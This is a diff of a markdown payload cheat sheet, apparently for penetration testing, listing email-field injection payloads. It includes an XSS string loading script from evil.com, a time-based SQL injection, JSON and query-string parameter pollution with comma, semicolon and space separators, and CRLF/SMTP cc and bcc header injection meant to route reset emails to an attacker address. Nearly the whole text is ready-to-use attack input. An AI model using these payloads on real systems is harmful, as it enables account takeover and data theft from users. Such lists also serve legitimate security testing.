@@ -1,3 +1,5 @@
+
+## Blind SQLi 
 ```
 "'--><script/src=//evil.com></script>"@example.com
 "'-sleep(5)-'"@mail.local
@@ -5,29 +7,45 @@
 
 ## Comma saperator with HPP chain
 
+```
 {"email":"Victim@gmail.com,Attacker@gmail.com","email":"Victim@gmail.com"}
 {"email":"Victim@gmail.com","email":"Victim@gmail.com,Attacker@gmail.com"}
-// Semiclon saperator with HPP chain
+```
+
+## Semiclon saperator with HPP chain
+```
 {"email":"Victim@gmail.com;Attacker@gmail.com","email":"Victim@gmail.com"}
 {"email":"Victim@gmail.com","email":"Victim@gmail.com;Attacker@gmail.com"}
-// Space saperator with HPP chain
+```
+
+## Space saperator with HPP chain
+```
 {"email":"Victim@gmail.com%20Attacker@gmail.com","email":"Victim@gmail.com"}
 {"email":"Victim@gmail.com","email":"Victim@gmail.com%20Attacker@gmail.com"}
-// Carbon Copy (CC:) with HPP chain
+```
+
+## Carbon Copy (CC:) with HPP chain
+```
 {"email":"Victim@mail.com%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
 {"email":"Victim@mail.com","email":"Victim@mail.com%0Acc:Attacker@mail.com"}
+```
 
-// Blind Carbon Copy (BCC:) with HPP chain
+## Blind Carbon Copy (BCC:) with HPP chain
+```
 {"email": "Victim@mail.com%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
 {"email":"Victim@mail.com","email":"Victim@mail.com%0Abcc:Attacker@mail.com"}
+```
 
-#Parameter Pollution
+## Parameter Pollution
+```
 email=victim@gmail.com&email=attacker@gmail.com
+```
 
-#CRLF and SMTP Inejciton
+## CRLF and SMTP Inejciton
+```
 email=victim@gmail.com%0a%0dcc:attacker@gmail.com
+```
 
-#Padding in Json Body
 {"email":["victim@gmail.com","attacker@gmail.com"]}
 
 #Using Seperators
